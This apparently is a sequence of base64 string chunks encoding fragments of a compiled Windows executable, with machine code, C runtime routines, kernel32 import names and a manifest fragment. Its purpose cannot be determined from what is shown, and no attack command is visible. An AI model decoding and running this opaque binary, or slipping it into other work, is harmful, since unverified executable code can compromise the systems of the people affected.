EJChFM+RIhcB1GUiNFQoAAABIi8zoxkQAAJCQg8j/6Z8CAABIiQV1eAEARIktlpYBAEgFAAsAAEg7yHM5ZsdBCAAKSIMJ/0SJYQyAYTiAikE4JH+IQThmx0E5CgpEiWFQRIhhTEgDz0iJTCQoSIsFLHgBAOu8SI1MJFD/FT+5AABmRDmkJJIAAAAPhEIBAABIi4QkmAAAAEiFwA+EMQEAAEyNcARMiXQkOEhjMEkD9kiJdCRAQb8ACAAARDk4RA9MOLsBAAAAiVwkMEQ5PfaVAQB9c0iL10mLzejZ6v//SIvISIlEJChIhcB1CUSLPdWVAQDrUkhj00yNBaF3AQBJiQTQRAEtvpUBAEmLBNBIBQALAABIO8hzKmbHQQgACkiDCf9EiWEMgGE4gGbHQTkKCkSJYVBEiGFMSAPPSIlMJCjrx//D64BBi/xEiWQkIEyNLUp3AQBBO/99d0iLDkiNQQJIg/gBdlFB9gYBdEtB9gYIdQr/FTa4AACFwHQ7SGPPSIvBSMH4BYPhH0hr2VhJA1zFAEiJXCQoSIsGSIkDQYoGiEMISI1LEEUzwLqgDwAA6IoIAAD/Qwz/x4l8JCBJ/8ZMiXQkOEiDxghIiXQkQOuEQYv8RIlkJCBJx8f+////g/8DD43NAAAASGP3SGveWEgDHah2AQBIiVwkKEi','TOi3y2ZKwAASDvDSA9EwUiJBaVQAQBIi1wkSEj30EiJBZ5QAQBIg8QgXcNIi8RIiVgISIloEEiJcBhIiXggQVZIg+xA/xXRsQAARTP2SIv4SIXAD4SpAAAASIvYZkQ5MHQUSIPDAmZEOTN19kiDwwJmRDkzdexMiXQkOEgr2EyJdCQwSNH7TIvAM9JEjUsBM8lEiXQkKEyJdCQg/xUKsQAASGPohcB0UUiLzei74///SIvwSIXAdEFMiXQkOEyJdCQwRI1LAUyLxzPSM8mJbCQoSIlEJCD/Fc+wAACFwHULSIvO6OPm//9Ji/ZIi8//FS+xAABIi8brC0iLz/8VIbEAADPASItcJFBIi2wkWEiLdCRgSIt8JGhIg8RAQV7DSIlcJCBXSIPsQEiL2f8V+bAAAEiLu/gAAABIjVQkUEUzwEiLz/8VIbAAAEiFwHQySINkJDgASItUJF','IDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABAEwBAAB4ooCiiKKgoqiisKK4otCi2KLgokijWKNoo3ijiKOYo6ijuKPIo9ij6KP4owikGKQopDikSKRYpGikeKSIpJikqKS4pMik2KTopPikCKUYpSilOKVIpVilaKV4pYilmKWopbilyKXYpeil+KUIphimKKY4pkimWKZopnimiKaYpqimuKbIptim6Kb4pginGKcopzinSKdYp2ineKeIp5inqKe4p8in2Kf4pwioGKgoqDioSKhYqGioeKiIqJioqKi4qMio2KjoqPioCKkYqSipOKlIqVipaKl4qYipmKmoqbipyKnYqeip+KkIqhiqKKo4qkiqWKpoqniqiKqYqqiquKrIqtiq6Kr4qgirGKsoqzirSKtYq2ireKuIq5irqKu4q8ir2Kvoq/irCKwYrCisOKxIrFisaKx4rIismKyorLisyKwAIAEAoAAAADCmOKZApkimUKZYpmCmaKZwpnimgKaIppCmmKagpqimsKa4psCmyKbQptim4KbopvCm+KYApwinEKcYpyCnOKdAp0inUKdYp2CnaKdwp3iniKeQp3iogKiIqJCosKi4qFitYK1orXCtqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrwAAADABAOQAAAAQqRipIKkoqXipiKmYqaipuKnIqdip6Kn4qQiqGKooqjiqSKpYqmiqeKqIqpiqqKq4qsiq2KroqviqCKsYqyirOKtIq1iraKt4q4irmKuoq7iryKvYq+ir+KsIrBisKKw4rEisWKxorHisiKyYrKisuKzIrNis6Kz4rAitGK0orTitSK1YrWiteK2IrZitqK24rcit2K3orfitCK4YriiuOK5IrliuaK54roiumK6orriuyK7Yruiu+K4IrxivKK84r0ivWK9or3iviK+Yr6ivuK/Ir9iv6K/4rwAAAEABAAgCAAAIoBigKKA4oEigWKBooHigiKCYoKiguKDIoNig6KD4oAihGKEooTihSKFYoWiheKGIoZihqKG4ocih2KHoofihCKIYoiiiOKJIoliiaKJ4ooiimKKooriiyKLYouii+KIIoxijKKM4o0ijWKNoo3ijiKOYo6ijuKPIo9ij6KP4owikGKQopDikSKRYpGikeKSIpJikqKS4pMik2KTopPikCKUYpSilOKVIpVilaKV4pYilmKWopbilyKXYpeil+KUIphimKKY4pkimWKZopnimiKaYpqimuKbIptim6Kb4pginGKcopzinSKdYp2ineKeIp5inqKewp8Cn0Kfgp/CnAKgQqCCoMKhAqFCoYKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKogqjCqQKpQqmCqcKqAqpCqoKqwqsCq0KrgqvCqAKsQqyCrMKtAq1CrYKtwq4CrkKugq7CrwKvQq+Cr8KsArBCsIKwwrECsUKxgrHCsgKyQrKCssKzArNCs4KzwrACtEK0grTCtQK1QrWCtcK2ArZCtoK2wrcCt0K3grfCtAK4QriCuMK5ArlCuYK5wroCukK6grrCuwK7QruCu8K4ArxCvIK8wr0CvUK9gr3CvgK+Qr6CvsK/Ar9Cv4K/wrwBQAQDIAAAAAKAQoCCgMKBAoFCgYKBwoICgkKCgoLCgwKDQoOCg8KAAoRChIKEwoUChUKFgoXChgKGQoaChsKHAodCh4KHwoQCiEKIgojCiQKJQomCicKKAopCioKKwosCi0KLgovCiAKMQoyCjMKNAo1CjYKNwo4CjkKOgo7CjwKPQo+Cj8KMApBCkIKQwpECkUKRgpHCkgKSQpKCksKTApNCk4KTwpAClEKUgpTClQKVQpWClcKWApZCloKWwpcCl0KXgpQAAAGABALAAAABgrWitcK14rYCtiK2QrZitoK2orbCtuK3Arcit0K3YreCt6K3wrfitAK4IrhCuGK4griiuMK44rkCuSK5QrliuYK5ornCueK6AroiukK6YrqCuqK6wrriuwK7IrtCu2K7gruiu8K74rgCvCK8QrxivIK8orzCvOK9Ar0ivUK9Yr2CvaK9wr3ivgK+Ir5CvmK+gr6ivsK+4r8CvyK/Qr9iv4K/or/Cv+K8AcAEAKAAAAACgCKAQoBigIKAooDCgOKBAoEigUKBYoGCgaKBwoAAAAIABAAwAAABYpwAAALABAHgAAAAwoDigIKIoojCiOKJAokiiUKJYomCiaKLgqfipCKoYqiiqOKpIqliqaKp4qoiqmKqoqriqyKrYquiq+KoIqxirKKs4q0irWKtoq3iriKuYq6iruKvQq+CroK+or7CvuK/Ar8iv0K/Yr+Cv6K/wr/ivAMABAPwAAAAAoAigEKAYoCCgKKAwoDigQKBIoFCgWKBgoGigcKB4oICgiKCQoJigoKCooLCguKDAoMig0KDYoOCg6KDwoAChCKEQoRihIKEooTChOKFAoUihUKFYoWChaKFwoXihgKGIoZChmKGgoaihsKG4ocChyKHQodih4KHoofCh+KEAogiiEKIYoiCiKKIwojiiQKJIolCiWKJgoqiiyKLoogijKKNgo3ijgKOIo5CjAKQIpBCkGKQgpCikMKQ4pECkSKRYpGCkaKRwpHikgKSIpJCkoKSopLCkuKTIp9Cn2KfgpwioMKhYqICoqKjIqPCoKKlgqZCpAAAAAAAAAAA=','aEUzyUyLw+h3JAAASI1MJGhIi9eL2Oj4GAAAi8i4AwAAAITYdQyD+QF0GoP5AnUT6wX2wwF0B7gEAAAA6wf2wwJ1AjPAgHwkWAB0DEiLTCRQg6HIAAAA/UiLTCR4SDPM6IJi//9Ii5wkoAAAAEiBxIAAAABfw8xFM8npYP7//0iJXCQIRA+3WgZMi9GLSgRFD7fDuACAAABBuf8HAABmQcHoBGZEI9iLAmZFI8GB4f//DwC7AAAAgEEPt9CF0nQYQTvRd','AAAAAAoVgGAAQAAAAgAAAAAAAAAMFYBgAEAAAAJAAAAAAAAADhWAYABAAAACgAAAAAAAABAVgGAAQAAAAsAAAAAAAAASFYBgAEAAAAMAAAAAAAAAFBWAYABAAAADQAAAAAAAABYVgGAAQAAAA4AAAAAAAAAYFYBgAEAAAAPAAAAAAAAAGhWAYABAAAAEAAAAAAAAABwVgGAAQAAABEAAAAAAAAAeFYBgAEAAAASAAAAAAAAAIBWAYABAAAAEwAAAAAAAACIVgGAAQAAABQAAAAAAAAAkFYBgAEAAAAVAAAAAAAAAJhWAYABAAAAFgAAAAAAAACgVgGAAQAAABgAAAAAAAAAqFYBgAEAAAAZAAAAAAAAALBWAYABAAAAGgAAAAAAAAC4VgGAAQAAABsAAAAAAAAAwFYBgAEAAAAcAAAAAAAAAMhWAYABAAAAHQAAAAAAAADQVgGAAQAAAB4AAAAAAAAA2FYBgAEAAAAfAAAAAAAAAOBWAYABAAAAIAAAAAAAAADoVgGAAQAAACEAAAAAAAAA8FYBgAEAAAAiAAAAAAAAAPhWAYABAAAAIwAAAAAAAAAAVwGAAQAAACQAAAAAAAAACFcBgAEAAAAlAAAAAAAAABBXAYABAAAAJgAAAAAAAAAYVwGAAQAAACcAAAAAAAAAIFcBgAEAAAApAAAAAAAAAChXAYABAAAAKgAAAAAAAAAwVwGAAQAAACsAAAAAAAAAOFcBgAEAAAAsAAAAAAAAAEBXAYABAAAALQAAAAAAAABIVwGAAQAAAC8AAAAAAAAAUFcBgAEAAAA2AAAAAAAAAFhXAYABAAAANwAAAAAAAABgVwGAAQAAADgAAAAAAAAAaFcBgAEAAAA5AAAAAAAAAHBXAYABAAAAPgAAAAAAAAB4VwGAAQAAAD8AAAAAAAAAgFcBgAEAAABAAAAAAAAAAIhXAYABAAAAQQAAAAAAAACQVwGAAQAAAEMAAAAAAAAAmFcBgAEAAABEAAAAAAAAAKBXAYABAAAARgAAAAAAAACoVwGAAQAAAEcAAAAAAAAAsFcBgAEAAABJAAAAAAAAALhXAYABAAAASgAAAAAAAADAVwGAAQAAAEsAAAAAAAAAyFcBgAEAAABOAAAAAAAAANBXAYABAAAATwAAAAAAAADYVwGAAQAAAFAAAAAAAAAA4FcBgAEAAABWAAAAAAAAA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